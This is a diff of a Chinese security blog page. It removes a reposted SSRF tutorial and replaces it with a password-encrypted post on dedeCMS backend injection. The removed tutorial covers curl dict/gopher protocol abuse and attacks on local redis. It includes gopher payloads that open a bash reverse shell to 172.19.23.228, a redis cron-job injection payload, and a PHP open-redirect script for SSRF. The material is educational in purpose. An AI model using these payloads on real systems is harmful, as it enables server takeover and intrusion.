@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SSRF漏洞研究[转载], Joker">
-    <meta name="description" content="SSRF漏洞研究[转载]">
+    <meta name="keywords" content="dedeCMS后台注入, Joker">
+    <meta name="description" content="dedeCMS后台注入">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>SSRF漏洞研究[转载] | Joker</title>
+    <title>dedeCMS后台注入 | Joker</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -197,12 +197,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSRF漏洞研究[转载]</h1>
+                    <h1 class="description center-align post-title">dedeCMS后台注入</h1>
                 </div>
             </div>
         </div>
@@ -317,25 +317,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/SSRF/">
-                                <span class="chip bg-color">SSRF</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E8%BD%AC%E8%BD%BD/" class="post-category">
-                                转载
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -344,28 +331,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-01
+                    2020-04-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-10
+                    2020-04-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.8k
+                    7
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    1 分
                 </div>
                 
 				
@@ -381,136 +368,15 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h1><p>本文转载自：<img src="https://github.com/xinali/articles/issues/16" alt></p>
-<p>感觉这个师傅的很多细节是自己没有涉及的，转载保存一下。</p>
-<h1 id="SSRF-利用"><a href="#SSRF-利用" class="headerlink" title="SSRF 利用"></a><code>SSRF 利用</code></h1><p>SSRF目前我所见过的主要攻击本地服务器主要有两种方式一个是利用redis，另一种是利用Memcached<br>进行SSRF攻击，利用最多的库就是<code>libcurl</code>，比如php中的<code>curl_exec</code>，<code>curl</code>命令行等，可以先具体看看curl在SSRF中的作用。</p>
-<h2 id="SSRF-客户端主要利用方式"><a href="#SSRF-客户端主要利用方式" class="headerlink" title="SSRF 客户端主要利用方式"></a><code>SSRF 客户端主要利用方式</code></h2><h3 id="curl支持的协议"><a href="#curl支持的协议" class="headerlink" title="curl支持的协议"></a><code>curl支持的协议</code></h3><p>查看<code>curl</code>支持的协议</p>
-<pre><code># curl -V
-Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp </code></pre><p>我们通过使用curl的几个协议可以知道，入侵主机的一些程序信息</p>
-<ol>
-<li>dict</li>
-</ol>
-<pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;
-victim.com   $ nc -lvvp 2323 Listening on [0.0.0.0] (family 0, port 2323)                               
-Connection from xxx 33442 received!  
-CLIENT libcurl 7.47.0</code></pre><ol>
-<li>sftp</li>
-</ol>
-<pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;
-evil.com     $ nc -v -l 11111
-Listening on [0.0.0.0] (family 0, port 11111)
-Connection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)
-CLIENT libcurl 7.40.0
-QUIT</code></pre><blockquote>
-<p>大部分的libcurl都不支持sftp协议，需要经过编译才能支持，所以一般这种探测都不会成功。不支持可以表现 在两个方面，一种是客户端的curl不支持发送sftp协议的数据，另一方面服务器端没有办法利用ssrf进行sftp的请求或接受该协议数据。</p>
-</blockquote>
-<ol>
-<li>gopher<br>gopher协议最简单的请求： gopher://127.0.0.1:2333/_test<br>gopher可以向任何端口发送任意形式的请求，例如http的post包：</li>
-</ol>
-<pre><code>gopher://test.com/_POST /exp.php HTTP/1.1%0d%0aHost: test.com_ip%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null</code></pre><p>比如我们利用gopher发送符合redis协议的数据包，攻击本地的redis，首先产生redis数据协议，可以利用下面的脚本产生需要的redis协议数据，只要每个数据用<code>%0d%0a</code>分割即可</p>
-<pre><code>#!/bin/bash
-#
-# License: MIT
-# Author: Michael Weibel
-#
-gen_redis_protocol() {
-    cmd=$1
-    proto=&quot;&quot;
-    proto+=&quot;*&quot;
-
-    number_of_words=0
-    byword=&quot;&quot;
-    for word in $cmd
-    do
-        number_of_words=$[number_of_words+1]
-        byword+=&quot;$&quot;
-        byword+=${#word}
-        byword+=&quot;\\r\\n&quot;
-        byword+=$word
-        byword+=&quot;\\r\\n&quot;
-    done
-    proto+=${number_of_words}
-    proto+=&quot;\\r\\n&quot;
-    proto+=${byword}
-    printf $proto
-}
-gen_redis_protocol &quot;SET mykey Hello&quot;</code></pre><p>因为redis是通过<code>\r\n</code>即<code>%0d%0a</code>，来分割每条命令的，所以首先用上面的脚本生成符合redis协议的数据，之后利用<code>%0d%0a</code>合并即可，举个简单的例子</p>
-<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><p>实际上任何形式的报文都可以发，在下划线之后的内容既是报文内容，要注意url加密问题。<br>其中sftp和dict主要用于获取服务器端<code>libssh</code>和<code>libcurl</code>的版本信息，因为可以利用这两个软件的信息进行漏洞利用，gopher则可以直接进行攻击。</p>
-<blockquote>
-<p>libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237)</p>
-</blockquote>
-<h2 id="SSRF-起源-服务器后端语言"><a href="#SSRF-起源-服务器后端语言" class="headerlink" title="SSRF 起源---服务器后端语言"></a><code>SSRF 起源---服务器后端语言</code></h2><h3 id="SSRF-服务器端-php后端"><a href="#SSRF-服务器端-php后端" class="headerlink" title="SSRF 服务器端--php后端"></a><code>SSRF 服务器端--php后端</code></h3><p>如果利用php写的后端，那么php中可以触发ssrf的函数： <code>file_get_contents()</code>, <code>fsockopen()</code>, <code>curl_exec()</code>, <code>fopen()</code></p>
-<ol>
-<li><code>curl_exec()</code>，可以发送get请求和post请求：<br>curl如果前面不输入协议会自动走http协议， 默认情况下，curl不会跟踪302跳转，并且curl不支持php的伪协议，不用考虑文件包含漏洞。</li>
-</ol>
-<pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php
-&lt;?php
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, &#39;http://172.16.1.4/302.php&#39;);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($curl, CURLOPT_HEADER, 1);
-curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); # 设置curl跟踪302跳转
-$response = curl_exec($curl);
-var_dump($response);
-curl_close($curl);
-?&gt;</code></pre><ol>
-<li><code>file_get_contents</code>只能get访问url，但是默认情况下就支持302跳转</li>
-</ol>
-<pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php
-&lt;?php
-$response = file_get_contents(&quot;http://172.16.1.4/302.php&quot;);
-var_dump($response);
-?&gt;</code></pre><p>必须输入协议，比如<code>http://</code>，在<code>php5.6</code>和<code>php7.1.7</code>测试下都不支持gopher。</p>
-<blockquote>
-<p>同样该函数也是LFI(本地文件包含)漏洞需要重点关注的函数</p>
-</blockquote>
-<ol>
-<li>fsockopen需要自己写http报文，几乎不会有人用吧。 Fopen用的也很少，但是它是可以请求一个url的，如果php开启了 fopen 的 gopher wrapper，那么fopen就可以直接发送gopher请求。<br>能够运行的原因就是<code>curl</code>扩展支持<code>dict</code>和<code>file</code>协议，可以利用这些协议对主机进行相关的数据请求。普通的标签，比如<code>img</code>，<code>script</code>等基本都不会支持那么多的协议，就本就要想别的办法。</li>
-</ol>
-<h2 id="SSRF-提供某种服务-redis-memcache"><a href="#SSRF-提供某种服务-redis-memcache" class="headerlink" title="SSRF 提供某种服务--redis/memcache"></a><code>SSRF 提供某种服务--redis/memcache</code></h2><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a><code>redis</code></h3><p>redis支持的通信协议格式</p>
-<pre><code>*&lt;参数数量&gt; CR LF
-$&lt;参数 1 的字节数量&gt; CR LF
-&lt;参数 1 的数据&gt; CR LF
-...
-$&lt;参数 N 的字节数量&gt; CR LF
-&lt;参数 N 的数据&gt; CR LF</code></pre><p>具体可以打印出来的是这样的</p>
-<pre><code>*3
-$3
-SET
-$5
-mykey
-$7
-myvalue</code></pre><p>每行数据都是利用<code>\r\n</code>(<code>%0d0a</code>)分割的，只要能够发送这样的数据，redis都照常解析</p>
-<ol>
-<li><code>http</code> 协议<br>正常如果使用<code>http</code>协议请求<code>redis</code>，会出现这样的错误</li>
-</ol>
-<pre><code>$ curl &#39;http://212.24.111.64:6379/%0D%0Ainfo&#39;
--ERR wrong number of arguments for &#39;get&#39; command
--ERR unknown command &#39;User-Agent:&#39;
--ERR unknown command &#39;Host:&#39;
--ERR unknown command &#39;Accept:&#39;</code></pre><p>出现这样错误是因为<code>http</code>协议的头数据都是通过<code>\r\n</code>来分割的，redis解析这样的数据，所以就出现了上面的错误。如果想要通过<code>http</code>数据利用redis，那么服务器端进行远程(或本地)请求的函数必须存在<code>CRLF</code>这样<code>http</code>头解析漏洞。</p>
-<ol>
-<li>CRLF漏洞<br>如果目标服务器存在CRLF漏洞，对redis使用http请</li>
-</ol>
-<blockquote>
-<p>我根据数据报文格式和redis的通信协议，猜测redis就是解析tcp数据包，以<code>\r\n</code>即<code>%0D%0A</code>为分割线，分割成各个命令，所以如果存在CRLF漏洞，那么可以直接将命令注入报文中，redis解析之后直接执行命令！<br>比如redis支持<code>dict</code>协议</p>
-</blockquote>
-<pre><code>curl &#39;http://xx:6379/info&#39;
-curl &#39;http://xx:6379/config set dir /var/www/html&#39;</code></pre><p>ssrf在利用的过程中，经常会遇到某个应用”不支持”某种协议的情况，确切来说不是不支持，而是没有办法直接利用，举个例子，redis没有办法直接用<code>http</code>请求进行相关操作，如果直接用的话，会遇到这样的情况</p>
-<h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a><code>memcache</code></h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><code>参考链接</code></h2><p><a href="http://redisdoc.com/topic/protocol.html" target="_blank" rel="noopener">redis通信协议</a><br><a href="http://106.14.61.185/2016/12/07/ssrf/" target="_blank" rel="noopener">ssrf总结</a></p>
-<p>360识图ssrf：<a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611" target="_blank" rel="noopener">http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611</a><br>远程服务器脚本：</p>
-<pre><code>&lt;?php
-$ip = $_GET[&#39;ip&#39;];
-$port = $_GET[&#39;port&#39;];
-$scheme = $_GET[&#39;s&#39;];
-$data = $_GET[&#39;data&#39;];
-header(&quot;Location: $scheme://$ip:$port/$data&quot;);
-?&gt;</code></pre><p>ssrf=&gt; mysql 导致getshell：<a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p>
-<hr>
-<p>版权声明：</p>
-<p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p>
-<hr>
-
+                <div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">Please enter the password to read.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="9d5fe6536948b61784e9aba73a2e0944c4632865068c397e9e5883981bd02d7d">9e41d281158d15ba527e130a9ec452ffa868d6ff44df91dcd5aac8b3a003f46391aa8baa40d49a1bad55da19b3aa37c04b89892134522e0b7f5662795ae3ffcad4d6299ff8be251c2927fcceb3775cb5bcd0aa0ca098c7232a98605032ea3a1153e82183cf6969f06d2d8dd448f1a444197d4d93469b7bc48608d5ba4913f935045ac1fa1648c4e6b42184911bad3c0ca09bcdb519444724edfa280b893cfa902ec7ec24c11cba629f37bf7202473a65e2a6d99072287e471b777b42d5ccb47f3572bfa1df1d8eab8ff7ef20304e47d3631a773d97cc29f317797d14e79792348697e7cbb5019b17c6630231b28e30730677620d555537a87daca1ad5348823961d6c8b9af861e5b385f18900894b5d6cf3ffb0a716ac3d15a3899ab489ac4b7fad2db4c7563f4cbb9d1ce9f0e6e077db4daaf6ac67f33732c17592099fcc958b13415fe8ed7499cdb3a28803d3600f280e3dbc157f814dccfcbc9baecad7034baec734402fae8d00584202e2ac84db91493ec56ab5a292e7f78e9116ff741b3f0232bad671857a3b2bf6ccc15aa64d29a3e1b82fcf3687657306c6175d2d210d73312515884dcbde8080da5cf3b530e92c710c05c8cde810ad32d89d394b3e1039689ac0e62bbd4504484ec01dbbc2fcc42358a2d50290e56fd3e5b7d395c2843b970a1ad6d7c46a4f10861633c91638809582c9d9ae8ba8593a3f9d8e3636d5ebd3bb9c950622ed0fa6cb4b094835acf3896ab386160d514130c4ca56e4458a89c5013c1fedad119b4afd5a30b270ccaaced5a904de366edd3ea86c73ca5a797218a6c9e7be96aa2e2ad24cb3e61556e5d755132b445065ae318bf7b35cc0648bce461be5515b8ea17b8b07be8e359c910ce81c02cc67c973bfe9acba476629e33d6e96a0bd2715589a9ae42720a197f5010254910cd8ef081e7af7f4c1958a32d0cf1dcf4a7cdc1d708cb2730e107303d61e3b8e5167595cdbbb9b4da154950e4224cda4656cfb681207a1cc3045559ff18e40d75537a8c1811bd354a7782f493d72315cccf0b5362da294729fe0b1072eac0335523520ca6bd495a9d975742d0c19e380edc091183e88360dc7bff0eaaf42237f7bb9ce6f776a991f8950c51bc8093362d843159758c5d13e07435f02abce61305689ccdd1e5cce732c4d3eafeb3165a358f3a8881d2bd63c44c592e127eaf6b530c417eaa6747844213fdfc8a74eb79e858e5547dc419b396cada9395bb91b6705edb42368ac6e561610a7601064a1ed52e7e2ea9541e9cd705ae07dea9235a855e25a4ed9ee382001d905dbb0ad8b1abb61a97eddc4c025f4fa44d789caf5d80176889f27a47a2bdb32ad98c41f297c6aeefcb790cbe8347bfd18047fc00c5b47e9085a53fd24b02bad5e7f92a1a7e471db6a7e0059e57f488a0fbef96ceefe82a98bee36d90ac17192b0a345f6f866a31a0c0e238fe35bed58824e5a35c022e435d5ed2592cafd77811a925fcdcf35f1f869190f08401dfd7a13eaf9e3be8e4092a1d7bf2bf1eba41d583bb2322cf0bc2c465a0e7357492117355c5c872b7cb5655fd3c1131c3dba353e1b7f5bf180cc670f6dcd25afaba9fe31485cbb9236460c07522aed6342f244abb923236c3bb02f08dc797b7397c05c8ff27b6b6e8501fe6a7e5bc477a7756675c0b4171e2c840b3383b4a289682366aab0969fa711571d5fd5f38060c358db00595dad603f2cc3beaec4b80c30ba63824dbd09a6480da93d897eae1d26357a642684c28caa8e893c51f7518dafae5dc412a2d580db996f9a7471f87d168d32f2a9b43cd67b6ad23448b30c4badaa3b1d7d2e777cabbc6e39435f5c24cc753efbb372b2850d4408f43eda44d0bf7bd0cc49836b2956f5afbb31d15b134cd527b6ea2dbdd4070fa2068243644b44a974fc6e430d273d187940a35a2f0c453a2ba231c7e6c60c6f110062369f837ed97d20ca9723adf503566c5cf7a7c3c9d0301fad73c0410d14b696b4c20003761fdad1b2fd630194da673ceb609489513ae4058ffe2ae0599078b34bf2ac952619c0d64d491bcd72d26420e8e4e183e8d80eb7c0524f330e868f21969f39908af777b79423bfdc9bd7192a0207266fa8ce39e391dbbac3d6d809320fbc48af5d026a4dd72cd987d8fab3bff2f616406ef48a774acfb5c9b784f37bf24259dae01a308f3a34ad22a689e91d87d72d74bad9110b97dcf344b40ed8da64b05f2cd75438a14d5daecab8c58c90b1c4aa67b2d40606ceebc38aadcdaee2bb71fa7046ae67222da6c5dd4b8bd9bcc6537e28a1c77507c19904bacdbb12729cbcac50cd2cad78dd2c6dc04cebfe37a7e8ae60adcfb2f27922198089839ebc4d3d16136010778e52ce54d8905fc77dbfa1f6293dcba7a</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
             </div>
             <hr/>
 
@@ -535,7 +401,7 @@ header(&quot;Location: $scheme://$ip:$port/$data&quot;);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://blog.j0k3r.cn/2133607805.html">http://blog.j0k3r.cn/2133607805.html</a>
+                    <a href="http://blog.j0k3r.cn/4199229624.html">http://blog.j0k3r.cn/4199229624.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -572,11 +438,7 @@ header(&quot;Location: $scheme://$ip:$port/$data&quot;);
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/SSRF/">
-                                    <span class="chip bg-color">SSRF</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -619,24 +481,24 @@ header(&quot;Location: $scheme://$ip:$port/$data&quot;);
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/186766472.html">
+                <a href="/164117074.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="信息搜集">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="buuoj每日一题（1）">
                         
-                        <span class="card-title">信息搜集</span>
+                        <span class="card-title">buuoj每日一题（1）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            信息搜集
+                            buuoj每日一题（1）
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-01
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-14
                         </span>
                         <span class="publish-author">
                             
@@ -656,32 +518,44 @@ header(&quot;Location: $scheme://$ip:$port/$data&quot;);
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/3983147628.html">
+                <a href="/2726031424.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="gopher协议学习">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="[转载]MySQL的select语法">
                         
-                        <span class="card-title">gopher协议学习</span>
+                        <span class="card-title">[转载]MySQL的select语法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            gopher协议学习
+                            [转载]MySQL的select语法
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-09
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Joker
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%BD%AC%E8%BD%BD/" class="post-category">
+                                    转载
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/mysql/">
+                        <span class="chip bg-color">mysql</span>
+                    </a>
+                    
                 </div>
                 
             </div>
